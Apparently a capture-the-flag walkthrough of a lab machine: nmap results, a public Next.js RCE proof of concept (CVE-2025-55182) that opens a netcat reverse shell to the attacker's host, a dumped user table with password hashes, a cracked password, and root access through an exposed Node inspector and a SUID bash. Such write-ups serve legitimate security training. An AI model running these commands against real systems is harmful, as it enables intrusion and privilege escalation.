### Nmap
```
nmap -sV -sC -vv 10.129.6.157

---OUTPUT---
Nmap scan report for 10.129.6.157
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2026-05-26 04:47:31 EDT for 19s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 26 May 2026 08:47:43 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 26 May 2026 08:47:43 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/26%Time=6A155E2E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1A0E,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Tue,\x2026\x20May\x202026\x2008:47:43\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Tue,
SF:\x2026\x20May\x202026\x2008:47:43\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Tue,\x2026\x20May\x202026\x2008:47:43\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 3000
- Loads to ReactorWatch
![[Pasted image 20260526045508.png]]
- Looking online for `nextwatch 15.0.3 exploit 2026 rce` I find: CVE-2025-55182
	- https://cybersecuritynews.com/poc-exploit-react-next-js/
- Looking for a PoC I find : https://github.com/whiteov3rflow/CVE-2025-55182-poc/tree/main

- Using that I manage to get a shell on my netcat listener:
```
python3 exploit.py 'busybox nc 10.10.16.9 9999 -e /bin/bash'


[*] Sending RCE payload to http://10.129.6.164:3000...
[*] Command: busybox nc 10.10.16.9 9999 -e /bin/bash
[!] Error: HTTPConnectionPool(host='10.129.6.164', port=3000): Read timed out. (read timeout=10)
```
![[Pasted image 20260526084201.png]]

- Looking at the files in the app folder (`/opt/reactor-app`) I find a `reactor.db` file. I check fgor sqlite3 and see it exists and dump the contents to find 2 hashes: `a203b22191d744a4e70ada5c101b17b8` for administrator and `39d97110eafe2a9a68639812cd271e8e` for engineer
```
sqlite3 reactor.db .dump

---OUTPUT---
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
);
INSERT INTO sensor_logs VALUES(1,'2025-12-28 14:32:01','CORE_TEMP_01',324.5,'NOMINAL');
INSERT INTO sensor_logs VALUES(2,'2025-12-28 14:32:01','PRESSURE_01',155.199999999999988,'NOMINAL');
INSERT INTO sensor_logs VALUES(3,'2025-12-28 14:32:01','COOLANT_FLOW',18.3999999999999985,'CAUTION');
COMMIT;
```
- I also see there is a user enginerer (from checking home directory)
- Using crackstation I crack the hash for `engineer` to be `reactor1`
![[Pasted image 20260526084507.png]]

- I switch to user `engineer`. 
```
su engineeer
> reactor1
```
![[Pasted image 20260526092809.png]]

- I grab user flag:
![[Pasted image 20260526092657.png]]

- I also see localhost ip is up. Checking `ss -tlnp` I see another port is open locally.
![[Pasted image 20260526092743.png]]

- I see port 9229 is open
- I also ssh to the target forwarding port 9229 to localhost:
```
ssh -L 9229:127.0.0.1:9229 engineer@10.129.6.164

>reactor1
```

- Furthermore looking at `/opt` there is another folder owned by root : `uptime-monitor` which had a file `worker.js`. The worker runs as root and makes HTTP requests to http://127.0.0.1:3000/ every 30 seconds. We control the Next.js app on port 3000 (that's how you got your shell). So you can make the root Node process do anything via the HTTP response it receives.

- I pass the node inspect command (can do it locally or at the target):
```
node inspect 127.0.0.1:9229

debug >
```

- To test initially I passed this command (**which failed i.e ran as the user passing the command, not as root**), using `require`
```
debug> require('child_process').execSync('id').toString()

--OUTPUT---

'uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)\n'
```
-  However using process.mainModule.require to access the module system runs as root
```
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")

---OUTPUT---
'uid=0(root) gid=0(root) groups=0(root)\n'
```

- Using this I can change the SUID bit for bash so we can run a shell as root:
```
exec("process.mainModule.require('child_process').execSync('chmod u+s /bin/bash').toString()")

---OUTPUT---
''
```

- I check the SUID bit for `/bin/bash` and see it has been added:
```
ls -al /bin/bash

---OUTPUT---
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
![[Pasted image 20260526094619.png]]

- I run bash shell  to become root:
```
bash -p
```
![[Pasted image 20260526094743.png]]

- I grab the root flag:
![[Pasted image 20260526094808.png]]

